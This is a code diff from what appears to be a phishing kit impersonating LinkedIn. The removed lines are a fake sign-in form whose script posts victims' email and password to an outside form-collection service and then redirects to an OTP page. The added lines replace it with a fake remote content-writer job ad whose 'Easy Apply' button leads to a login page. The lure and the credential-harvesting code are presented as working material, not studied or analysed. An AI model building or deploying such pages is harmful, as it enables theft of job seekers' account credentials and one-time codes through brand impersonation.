@@ -3,32 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In with Linkedin.</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <title>Linkedin Jobs</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
-        .container { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h2 { text-align: center; }
-        input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 100%; padding: 10px; background: #0077b5; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        button:hover { background: #005582; }
-        .otp-section { display: none; }
-    .header {
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding-bottom: 0px;
+            padding-bottom: 20px;
         }
         .logo {
             width: 150px;
-            margin: 0px auto;
+            
         }
-      @media (max-width: 600px) {
+        h1 {
+            font-size: 24px;
+            margin: 0;
+        }
+        .job-description {
+            margin: 20px 0;
+        }
+    .easy-apply-button {
+      display: inline-flex;
+      align-items: center;
+      background-color: #0a66c2;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+    .easy-apply-button i {
+      margin-right: 10px;
+      font-size: 20px;
+    }
+    .easy-apply-button:hover {
+      background-color: #004182;
+    }
+        .apply-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #0073b1;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .apply-button:hover {
+            background-color: #005582;
+        }
+        @media (max-width: 600px) {
             .header {
                 flex-direction: column;
                 align-items: flex-start;
             }
             .logo {
-                margin-bottom: 0px;
+                margin-bottom: 10px;
             }
         }
     </style>
@@ -36,43 +82,40 @@
 <body>
     <div class="container">
         <div class="header">
-         <img src="logo2.png" alt="Company Logo" class="logo">
+            <img src="logo.png" alt="Company Logo" class="logo">
+            <h1>We are looking for a skilled Content Writer to join our team on a long-term basis.</h1>
         </div>
-        <h2>Sign In </h2>
-        <div class="login-section">
-          <form id="loginForm">
-    <input type="email" id="email" name="email" placeholder="Email" required>
-    <input type="password" id="password" name="message" placeholder="Password" required>
-    <button type="submit">Sign In</button>
-    <p><a href="https://google.com/">Forgot Password?</a></p>
-    
-</form>
-
-<script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // Stop default form submission
-
-    const form = e.target;
-    const formData = new FormData(form);
-
-    fetch('https://formspree.io/f/mldbdovj', {
-        method: 'POST',
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-    }).then(function(response) {
-        if (response.ok) {
-            window.location.href = "otp.html"; // Redirect after successful submission
-        } else {
-            alert('Form submission failed. Please try again.');
-        }
-    }).catch(function(error) {
-        alert('There was an error. Please try again.');
-    });
-});
-</script>
+        <div class="job-description">
+            <p>We are looking for a creative and reliable Content Writer to join our team! Your role will be to create engaging, high-quality content for blogs, websites, and social media.</p>
+            <p><b>Responsibilities:</b></p>
+            <ul>
+                <li>Excellent command of English</li>
+                <li>Ability to write engaging, SEO-friendly content.</li>
+                <li>Experience in writing blog posts, product descriptions, and social media content.</li>
+                <li>Must be able to follow guidelines and meet deadlines.</li>
+                <li>Write clear, original, and well-researched content</li>
+               
+            </ul>
+            
+            <p><b>Requirements:</b></p>
+            <ul>
+                <li>Strong writing and editing skills</li>
+                <li>Ability to research and write on different topics</li>
+                <li>A professional Linkedin portfolio.</li>
+                <li>Good time management and communication skills.</li>
+               
+            </ul>
+            <p><i><b>Employment Type:</b> Part-time / Freelance.</i></p>
+            <p><i><b>Location:</b> Remote.</i> </p>
+            <p><i><b>Salary: </b>Negotiable.</i></p>
+            <p>Apply with your Linkedin profile to get response quickly.</p>
         </div>
-																	
+        <a href="login.html" class="easy-apply-button">
+          <i class="fab fa-linkedin"></i> Easy Apply
+        </a>
+        <a href="#" class="easy-apply-button">
+          <i class="fab fa-plus"></i>  Save
+        </a>
+    </div>
 </body>
 </html>
